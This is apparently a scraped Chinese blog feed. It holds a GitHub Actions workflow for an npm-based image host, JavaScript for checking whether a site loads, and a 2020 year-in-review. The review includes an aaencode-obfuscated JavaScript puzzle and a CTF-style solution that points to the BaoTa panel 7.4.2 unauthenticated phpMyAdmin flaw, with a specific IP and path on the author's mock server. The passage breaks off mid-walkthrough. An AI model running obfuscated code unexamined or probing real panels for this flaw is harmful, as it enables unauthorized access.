class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 4分8秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量...</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板...）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" 